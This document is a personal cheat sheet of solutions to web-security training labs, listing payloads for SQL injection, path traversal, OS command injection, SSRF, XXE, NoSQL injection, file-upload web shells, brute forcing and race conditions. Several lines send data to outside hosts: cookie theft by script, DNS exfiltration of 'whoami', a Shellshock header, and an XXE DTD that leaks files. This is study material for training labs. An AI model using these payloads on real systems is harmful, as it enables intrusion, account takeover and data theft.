Server-side summary
---
Ayooo, lucky me!

Author: Punthat Siriwan

---
**TOPICS**
- [SQLi](#sqli)
- [Authentication](#authentication)
- [Path Traversal](#path-traversal)
- [OS Command Injection](#os-command-injection)
- [Information Disclosure](#information-disclosure)
- [Access Control Vulnerabilities](#access-control-vulnerabilities)
- [File Upload Vuln](#file-upload-vuln)
- [Business Logic Vuln](#business-logic-vuln)
- [Race condition](#race-condition)
- [SSRF](#ssrf)
- [XXE](#xxe)
- [NoSQL injection](#nosql-injection)
- [API Testing](#api-testing)

----
----

# SQLi
try url encoding or double url encoding if the regular attack doesn't work

---

**SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**

`'OR 1=1 --`

---

**SQL injection vulnerability allowing login bypass**

`administrator'--`

---

**SQL injection attack, querying the database type and version on Oracle**

```sql
' ORDER BY 2 -- 
'+UNION+SELECT+'abc','def'+FROM+dual--
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

---

**SQL injection attack, querying the database type and version on MySQL and Microsoft**

```sql
UNION SELECT NULL,NULL -- #
' ORDER BY 2 -- #
UNION SELECT @@VERSION, NULL -- #
```

---

**SQL injection attack, listing the database contents on non-Oracle databases**

    category filter
```sql
' ORDER BY 2 --
' UNION SELECT TABLE_NAME,NULL FROM information_schema.tables --
' UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE TABLE_NAME = ‘users_dokxpf’ --
' UNION SELECT username_vjwkzr,password_pxooax FROM users_dokxpf --
```

---

**SQL injection attack, listing the database contents on Oracle**

    category filter
```sql
' ORDER BY 2 --
' UNION SELECT TABLE_NAME,NULL FROM all_tables --
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_STSRYZ'--
' UNION SELECT USERNAME_OZMBYW,PASSWORD_HJGEGA FROM USERS_STSRYZ --
```

---

**SQL injection UNION attack, determining the number of columns returned by the query**
```sql
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT 777,'TEST',13 --
```

---
**SQL injection UNION attack, retrieving data from other tables**
```sql
' ORDER BY 2 --
' UNION SELECT TABLE_NAME,NULL FROM information_schema.tables --
' UNION SELECT username,password FROM users --
```
---
**SQL injection UNION attack, retrieving multiple values in a single column**
```sql
' UNION SELECT NULL,username||'~'||password FROM users --
```
---
**Blind SQL injection with conditional responses**
    
    Cookie: TrackingId=...
    Welcome back!
1. add TrackingId asd..'AND '1'='1 then AND '1'='2
2. observe the response (any different?)
3. `TrackingId=..PBo' AND (SELECT 'a' FROM users LIMIT 1)='a `
4. go to Burp Intruder `TrackingId=...' AND (SELECT SUBSTRING(password,$pos$,1) FROM users WHERE username='administrator')='$password_a,b,c..,1,2,3$`

---

**Blind SQL injection with conditional errors**

    Cookie: TrackingId=...
    500 Internal Server Erro when add ' to TrackingId
1. add ' to a TrackingId found status:500
2. `TrackingId=xyz'||(SELECT '' FROM dual)||'` to know it is Orable DB
3. Burp Intruder => `'||(SELECT CASE WHEN SUBSTR(password,$pos$,1)='§password_1_char§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
4. observe for status 500

---

**Visible error-based SQL injection**

    Cookie: TrackingId=...
    Error from DB =>  TrackingId=..' AND 1=CAST((SELECT 1) AS int)--
`TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

---

**Blind SQL injection with time delays**

    Cookie: TrackingId=...
    TrackingId=x'||pg_sleep(10)--
1. `TrackingId=x'||pg_sleep(10)--` to check

---

**Blind SQL injection with time delays and information retrieval**

    Cookie: TrackingId=...
    TrackingId=x'||pg_sleep(10)--
1. `'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END` test for the vuln
2. Burp Intruder `'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,$pos$,1)=’§c§’)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--` but adjust resource pool maximum concurrent to 1 before attack
   
---

**SQL injection with filter bypass via XML encoding**

    XML
    Check stock in product page
1. in product page put `SELECT * FROM users` between productId xml tag => Attack detected
2. Hackvertor extension -> highlight the input -> encode -> dec_entities/hex_entities
3. `<storeId> 1 <@dec_entities> UNION SELECT username||'~'||password FROM users<@/dec_entities></storeId>`

----
----

# Authentication

---
**Username enumeration via different responses**
1. brute force username and password
2. observe the result of attack especially Response Length

---
**2FA simple bypass**
1. login as another user
2. direct to /my-acoount instead of /login2

---
**Password reset broken logic**
1. observe reset password logic
2. change username of POST /forgot-password

---
**Username enumeration via subtly different responses**
1. brute force username and password
2. first, username. little different "Invalid username or password" (without '.')
3. second, password. 302 and length or error msg

---
**Username enumeration via response timing**
1. brute force same as the previous lab but this time add `X-Forwarded-For: $IP$`
2. `$IP` just a number 1-100
3. Attack -> Columns -> Response completed order by Response received
4. password same as the previous

---
**Broken brute-force protection, IP block**
1. brute force same as the previous lab but this time add `X-Forwarded-For: $IP$`
2. `$IP` just a number 1-100
or if it doesn't work
1. wiener:peter login every 3 of carlos brute force attack e.g. wiener:peter, carlos:1, carlos:2, carlos:3, wiener:peter, carlos:4 ..

---
**Username enumeration via account lock**
1. try any bruteforce technique
2. password=pass$$&username=$username$ with cluster bomb which password=null(generate 5 payload)
3. observe for the response length

---
**2FA broken logic**

    email client
    /login2
    Cookie header: verify=username
1. GET /login2 with cookie verity=user to retrieve mfa-code
2. brute force mfa-code 0000-9999 at POST /login2 which verify=user
3. follow the attack

---
**Brute-forcing a stay-logged-in cookie**

    stay-logged-in cookie
1. stay-logged-in is from BASE64.ENCODE(USERNAME:MD5(PASSWORD)) e.g. b64(wiener:adf234c23r1234)
2. brute force with the technique; hash -> add prefix -> encode
3. grep the msg "Update email" or looking for different status code

---
**Offline password cracking**
1. comment on any post, then go to access log
```html
<script>document.location='https://exploit-0a59001703b631ea807f2f9c014b0021.exploit-server.net/exploit'+document.cookie</script>
```
2. try to cracking, found out the pattern is same as the previous lab BASE64.ENCODE(USERNAME:MD5(PASSWORD))
3. carlos:onceuponatime
   
---
**Password reset poisoning via middleware**

    login to carlos
    email client
1. add X-Forwarded-Host: exploit.../exploit and username of victim
2. go to access log, take a token to use at GET /forgot-password?TOKEN=$token

---
**Password brute-force via password change**

    change password in my-account page
1. notify the behaviour of the function; they are 3 kinds of responses
2. `username=carlos&current-password=§cpass§&new-password-1=1234&new-password-2=abcd` grep New passwords do not match
---

**Broken brute-force protection, multiple credentials per request** !EX

    login as carlos
    /resources/js/login.js
    login with json
1. POST /login notice it was JSON
2. in the body put all possible passwords it could be {"username":"carlos","password":["123456","abcdef","asd",...]}
---

**2FA bypass using a brute-force attack** !EX
    
    login as carlos
    2FA verification code
1. Sessions -> Session handling rules(Add) -> Scope -> URL Scope (Include all URLS) -> Details (Add: Run a macro) 
2. Under Select macro click Add to open the Macro Recorder. Select the following 3 requests: GET /login POST /login GET /login2
3. Click Test macro and check that the final response contains the page asking you to provide the 4-digit security code. This confirms that the macro is working correctly. 
4. send POST /login2 to Burp Intruder - concurrent = 1
5. trick!: POST /login2 the mfa-code should be just ine number (e.g. 0993) send the request continously until find status 302; because every sessions generate a new code. We hope just lucky to match the number we've entered

----
----

# Path Traversal
most entry point is at /image?filename=....jpg
**provide all technique here**
```
../../../etc/passwd
%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd

/etc/passwd

/var/www/images/../../../etc/passwd

../../../etc/passwd%00.png
```

----
----

# OS Command Injection
**OS command injection, simple case**

    execute whoami
    /product/stock
1. find any entry point
2. POST /product/stock e.g.`productId=1|whoami` or `&storeId=1`
---
**Blind OS command injection with time delays**

    delay
    feedback function
1. the vuln is at email input try e.g. `email=x||whoami`
2. for delay `ping+-c+10+127.0.0.1||` `ping+-c+10+127.0.0.1||l`
---
**Blind OS command injection with output redirection**

    execute whoami
    feedback function
1. find any entry point such as feedback; email is vuln
2. GET /image?filename=...jpg can do path traversal
3. POST /feedback/submit `csrf=IEjsQbgDtFVt5vgffJ3IV5UFD1JcGerR&name=NAME&email=EMAIL%40EMAIL||whoami>/var/www/images/output.txt||&subject=SUB&message=MES`
4. GET /image?filename=output.txt
---

**Blind OS command injection with out-of-band data exfiltration**

    feedback function
    whoami to DNS
1. find any entry point such as feedback; email is vuln
2. ```mail=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||```
---
**Blind OS command injection with out-of-band interaction**

    feedback function
1. same as the previous lab
`email=x||nslookup+x.oum2tlyq67wdtqp2h71z3ellxc34rwfl.oastify.com||`

----
----

# Information Disclosure

**Information disclosure in error messages**
1. try input something weirdo in any entry point like /product?productId=SOMETHING
2. observe the error
---
**Information disclosure on debug page**
1. view page source or discover content by burp
2. find SECRET_KEY
---
**Source code disclosure via backup files**
1. check robots.txt
---
**Authentication bypass via information disclosure**

    admin
1. change method from GET to TRACE
2. add `X-Custom-IP-Authorization: 127.0.0.1` header
3. if it doesn't work go to Proxy > Options Match and Replace put the upper text in the section
---
**Information disclosure in version control history**
    
    login as admin
1. check for ./git
2. wget -r https://URL/.git/
3. use `git` commands

----
----

# Access Control Vulnerabilities

**Unprotected admin functionality**
1. check for /robots.txt
---
**Unprotected admin functionality with unpredictable URL**
1. check for Debugger or source code by web dev tool
---
**User role controlled by request parameter**
1. once login. check for login request is there any cookie or params that can be vuln? (e.g. isAdmin=false -> isAdmin=true)
---
**User role can be modified in user profile**
1. observe any function when logged in
2. change email is JSON and the response contain more params
3. add vuln params (e.g.isAdmin=true, "roleid":2) to the request with the function
---
**User ID controlled by request parameter**
    
    API Key
1. change query params like (e.g. my-account?id=carlos -> my-account?id=carlos)
---
**User ID controlled by request parameter, with unpredictable user IDs**

    API key
    Blog post contain userId
1. visit any blog post that written by victim
2. get the userID to login as that user
---
**User ID controlled by request parameter with data leakage in redirect**

    API key
1. adjust request header by add `X-Custom-Authorization: 127.0.0.1`
---
**User ID controlled by request parameter with password disclosure**

    delete carlos
    update password function in my-account page
1. change id param to victim
2. view the response
---
**Insecure direct object references**

    live chat
1. try using function live chat 
2. view transcript -> download file, thn try change file name
---
**URL-based access control can be circumvented**

    delete carlos
    Admin panel in home page
`X-Original-Url: /admin`

---
**Method-based access control can be circumvented**

    User section in my-account; Upgrade - Downgrade
1. try change request from POST to GET or GET to POST
2. if it doesn't, play with cookie
---
**Multi-step process with no access control on one step**
1. login as admin to get the endpoint
2. replace the cookie value with normal user
---
**Referer-based access control**
add referrer header e.g. `Referer: https://sdakjvas3.../admin`

----
----

# File Upload Vuln
most of the entry point is at avatar upload or anywhere that can upload a file
**all tecchniques are here**
```
#php retrive secret
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
---
**Web shell upload via Content-Type restriction bypass**
    
    /home/carlos/secret
1. upload the vuln php, then intercept upload avatar request
2. `Content-Type: image/jpeg`
---
**Web shell upload via path traversal**

    /home/carlos/secret
`Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`
1. upload exploit php with filename `..%2fexploit.php`
2. `GET /files/exploit.php`
---
**Web shell upload via extension blacklist bypass**

    /home/carlos/secret
1. change vulue of filename param to `.htaccess`
2. Content-Type header `text/plain`
3. Replace contents fo PHP payload with `AddType application/x-httpd-php .l33t`
4. send the request, undo all then change filename to `exploit.l33t`
5. fetch that files
---
**Web shell upload via obfuscated file extension**

    /home/carlos/secret
1. In the Content-Disposition header, change the value of the filename parameter to include a URL encoded null byte, followed by the .jpg extension: `filename="exploit.php%00.jpg"`
2. fetch the file
---

**Remote code execution via polyglot web shell upload**

    /home/carlos/secret
```sh
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php so I crafted exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" black.jpg -o polyglot.php we will get polyglot.php file 
```
---
**Web shell upload via race condition**

    /home/carlos/secret
1. Create a PHP Web Shell that reads the “secret” file’s contents.
2. Intercept the POST File Upload Request and send it to the Intruder
3. Intercept the GET Request for the “shell.php” file
4. Make the following configurations in both Requests

----
----

# Business Logic Vuln

**Excessive trust in client-side controls**
1. observe POST /cart can do anything with it?
2. `price` param
---

**High-level logic vulnerability**
1. observe POST /cart can do anything with it?
2. `quantity` param - negative number
---

**Inconsistent security controls**

    delete carlos
    web shop
    /admin
1. register member with exploit-email
2. change email in my-account to admin email
---

**Flawed enforcement of business rules**
1. observe web shop
2. any promotion code can apply?
3. input promocode by sequences
---

**Low-level logic flaw**
1. send the request if quantity can't more than 100
2. send til reach negative number and it will round back
---

**Inconsistent handling of exceptional input**
    
    delete carlos
`attackerattacker...(very very long, more than 250 chars)@dontwannacry.com.exploit-0a8200d80472537c80057f18018700a3.exploit-server.net`
Make sure that the very-long-string is the right number of characters so that the "m" at the end of @dontwannacry.com is character 255 exactly. `attackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr@dontwannacry.com.exploit-0a8200d80472537c80057f18018700a3.exploit-server.net`

---

**Weak isolation on dual-use endpoint**

    delete carlos
    change-password
1. try remove `current-password` params
---

**Insufficient workflow validation**
bypass `/cart/order-confirmation?order-confirmed=true`

---
**Authentication bypass via flawed state machine**

    delete carlos
    /role-selector
1. try login and intercept all the request
---
**Infinite money logic flaw**

    Gift Card
1. buy a gift card using promocode then retrive the profit
2. do the macro by go to the session
3. POST /cart -> POST /cart/coupon -> GET /cart/order-confi... -> POST /gift-card
4. trick: Derive from priop response
---
**Authentication bypass via encryption oracle**

    delete carlos
    stay-logged-in
    Cookie: notification
1. post on any blog with invalid comment (e.g. no @, send the request with repeater)
2. add notification to the cookie
3. try input `&email=administrator:1707730245732` will get an error
`%34%4f%79%36%58%32%52%5a%75%74%41%68%53%69%69%52%42%31%77%77%61%79%59%55%6b%30%74%39%33%39%4c%52%48%51%57%66%33%69%7a%54%36%72%30%3d`

----
----

# Race condition

**Limit overrun race conditions**
1. use Burp Intruder to send PROMO request concurrent
---

**Bypassing rate limits via race conditions**

    delete carlos
    login attemps. Pleae try again in .. seconds
1. send post login to Turbo
2. copy password list to clipboard (Ctrl+C)
```python
def queueRequests(target, wordlists):

    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    
    # assign the list of candidate passwords from your clipboard
    passwords = wordlists.clipboard
    
    # queue a login request using each password from the wordlist
    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    
    # once every request has been queued
    # invoke engine.openGate() to send all requests in the given gate simultaneously
    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)
```
---
**Multi-endpoint race conditions**
```http
POST /cart HTTP/2
Host: 0a5000bf0479e02a80fe35ea00bf00de.web-security-academy.net
Cookie: session=K3YPbMvQuwFTRcfSRCCybcJcMfz0go7n
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: th,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: https://0a5000bf0479e02a80fe35ea00bf00de.web-security-academy.net
Referer: https://0a5000bf0479e02a80fe35ea00bf00de.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

productId=1&quantity=1&redir=CART
```
```http
POST /cart/checkout HTTP/2
Host: 0a5000bf0479e02a80fe35ea00bf00de.web-security-academy.net
Cookie: session=K3YPbMvQuwFTRcfSRCCybcJcMfz0go7n
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: th,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: https://0a5000bf0479e02a80fe35ea00bf00de.web-security-academy.net
Referer: https://0a5000bf0479e02a80fe35ea00bf00de.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

csrf=zGMR81e1udvzWAmGdtnlGwOZ73GNc6wO
```
sent these request in sequence with parallel

---
**Single-endpoint race conditions**

    delete carlos
    email client
    @ginandjuice.shop
1. send the update email in parallel with exploit mail and @ginandjuice, maybe have to send many times
---
**Exploiting time-sensitive vulnerabilities**

    delete carlos
    Forgot password?
1. GET /forgot-password without `phpsession` cookie, take the new cookie and csrf token to `POST /forget-password`
2. send two request in parallel mode (one: carlos, two: wiener)
3. visit any link change query string to `carlos`
---
**Partial construction race conditions** !EX

    delete carlos
    register with GinAndJuice only
    const confirmEmail = () => {...}
`POST /confirm?token[]=`
```http
POST /register HTTP/2
Host: 0a1e00df03dd32c180e9da650028008e.web-security-academy.net
Cookie: phpsessionid=T9oQ3Pbs4YiZxXc2q7bAZD4YSw3vtViu
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: th,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0a1e00df03dd32c180e9da650028008e.web-security-academy.net/register
Content-Type: application/x-www-form-urlencoded
Content-Length: 141
Origin: https://0a1e00df03dd32c180e9da650028008e.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

csrf=wuJPSs59FN4ccvUNwo3lcPicIuu9OMgg&username=%s&email=somemail@ginandjuice.shop&password=123456
```
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
                       concurrentConnections=1,
                       engine=Engine.BURP2
                       )
comfirmationReq = '''
POST /confirm?token[]= HTTP/2
Host: 0a8d00b6046524099ac4bf5900ff00e2.web-security-academy.net
Cookie: phpsessionid=Ry16pt9QanyoF2pNOdlq7iiAQLwKqKVx
Content-Length: 0
'''
for attempt in range(20):
    currentAttempt = str(attempt)
    username = 'uname' + currentAttepmt

    # queue a single registration request
    engine.queue(target.req, username, gate=currentAttempt)

    # queue 50 confirmation requests - note that this will probably sent in two separate packets
    for i in range (50):
        engine.queue(confirmationReq, gate=currentAttempt)

    # send all the queue requests for this attempt
    engine.openGate(currentAttempt)
def handleResponse(req, interesting):
table.add(req)
```
----
----
# SSRF
most entry points of the labs are in stockApi
**Basic SSRF against the local server**
1. notify stockApi
```
%68%74%74%70%3a%2f%2f%6c%6f%63%61%6c%68%6f%73%74%2f%61%64%6d%69%6e
http://localhost/admin/delete?username=carlos
```
---
**Basic SSRF against another back-end system**
1. notify stockApi
2. bruteforce to finding internal IP (e.g. http://192.168.0.$NUM$/admin)
---
**Blind SSRF with out-of-band detection**
1. notify stockApi
2. send to burp collab
---
**SSRF with blacklist-based input filter**
1. notify stockApi => External stock check blocked for security reasons
`stockApi=http://127.1/%2561dmin` `stockApi=http://127.1/%2561dmin/delete?username=carlos`

---
**SSRF with filter bypass via open redirection vulnerability**
1. notify stockApi
2. notify nextProduct
`tockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`

---
**Blind SSRF with Shellshock exploitation** !EX

    exfiltrate name of OS user
```https
GET /product?productId=1 HTTP/2
Host: 0a23005c04fb1c608040cb25004e002f.web-security-academy.net
Cookie: session=QxqVoH4LXs4tuJt5m0yC2l3OxRhOEcFo
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).dwdsbrqfyuf1k83pi3ohtkq2ltrlfb30.oastify.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: th,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.0.§1§:8080
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```
```http
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
Referer: http://192.168.0.§1§:8080
```
---
**SSRF with whitelist-based input filter** !EX

    delete carlos
1. notify stockApi (stock.weliketoshop)
2. add arbitary `#` to `user@URL`
```
http://localhost:80%2523@stock.weliketoshop.net/admin/
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```
----
----

# XXE
most of entry points are at check stock

**Exploiting XXE using external entities to retrieve files**

    /etc/passwd
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
<productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
---
**Exploiting XXE to perform SSRF attacks**

    SSRF attack
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
---
**Blind XXE with out-of-band interaction**

    out-of-band
    collab
```xml
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
<productId>
&xxe;
</productId>
```
---
**Blind XXE with out-of-band interaction via XML parameter entities**

    out-of-band
    collab
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://6w3lbkq8ynfuk13iiwoatdqvlmrjf93y.oastify.com"> %xxe; ]>
<stockCheck><productId>1</productId><storeId>1</storeId>
</stockCheck>
```
---
**Exploiting blind XXE to exfiltrate data using a malicious external DTD**

    /etc/hostname
    exploit server
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL(EXPLOIT_SERVER)"> %xxe;]>
```
external entity definition in between XML declaration `stockCheck`

---

**Exploiting blind XXE to retrieve data via error messages**

    /etc/passwd
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL(EXPLOIT_SERVER)"> %xxe;]>
```
external entity definition in between XML declaration `stockCheck`

---
**Exploiting XInclude to retrieve files**
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```
---

**Exploiting XXE via image file upload**

    /etc/hostname
    comment with upload avatar
```svg
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
1. post on any blog post
---

**Exploiting XXE to retrieve data by repurposing a local DTD** !EX

    /etc/passwd
    Check stock
```xml
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
between declaration and `stockCheck`

----
----

# NoSQL injection
most of labs contain `filter?category=..`, if the payload doesn't work try URL-encoding version
**Detecting NoSQL injection**
```noSQL
Gifts' && 0 && 'x
Gifts' && 1 && 'x
Gifts'||1||'
```
---
**Exploiting NoSQL operator injection to bypass authentication**

    login as admin
    login function : {"username":{"$ne":""},"password":{"$ne":""}}
```nosql
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```
---
**Exploiting NoSQL injection to extract**
    
    login as admin
    /user/lookup?user=..
```nosql
administrator' && this.password.length < 30 || 'a'=='b ## 8 char

administrator' && this.password[$pos$]=='$c$ 
```
brute force like sql injection pos(0-7), c(0-9a-b)

---
**Exploiting NoSQL operator injection to extract unknown fields**

    login as carlos
    Forgot password? function
    Account locked: please reset your password (when try logged in many times)
```
{"username":"carlos","password":{"$ne":"invalid"}, "$where":"Object.keys(this)[1].match('^.{§a§}§b§.*')"}

{"username":"carlos","password":{"$ne":"invalid"}, "$where":"Object.keys(this)[2].match('^.{§a§}§b§.*')"}

{"username":"carlos","password":{"$ne":"invalid"}, "$where":"Object.keys(this)[3].match('^.{§a§}§b§.*')"}
```
which a(0-20); b(0-9a-z)

post login
```
{"username":"carlos","password":{"$ne":"invalid"}, "$where":"this.YOURTOKENNAME.match('^.{§a§}§b§.*')"}
```
which a(0-20); b(0-9a-z)
`GET /forgot-password?YOURTOKENNAME=TOKENVALUE`

---

# API Testing
/api

**Exploiting an API endpoint using documentation**
`PATCH /api` `GET /api`

---
**Exploiting server-side parameter pollution in a query string**

    delete carlos
    Forgot password?
    /static/js/forgotPassword.js
1. send admin forgot password request
2. at POST /forgot-password
```
username=administrator%26field=x%23
username=administrator%26field=reset_token%23
GET /forgot-password?reset_token=RESPONSE_FROM_ABOVE
```
---
**Finding and exploiting an unused API endpoint**

    buy jacket
    /api/products/1/price
1. try `OPTIONS`
2. `PATCH /api/product/1/price` with params price and value
---
**Exploiting a mass assignment vulnerability**

    buy jacket
    /api/checkout
1. adjust `POST /api/checkout`
```json
{
    "chosen_discount":{
        "percentage":100
    },
    "chosen_products:":[
        {
            "product_id":"1",
            "quantity":1
        }
    ]
}
```
---
**Exploiting server-side parameter pollution in a REST URL** !EX

    delete carlos
    Forgot password?
    /static/js/forgotPassword.js
    forgotPwdReady(() =>

1. at POST /forgot-password
```
username=administrator
username=administrator#
username=./administrator
username=../../../../openapi.json#

username=administrator/field/passwordResetToken#
username=../../v1/users/administrator/field/passwordResetToken#
```
2. /forgot-password?passwordResetToken=$FROM_ABOVE$
----
----
Go0dLu(K my G.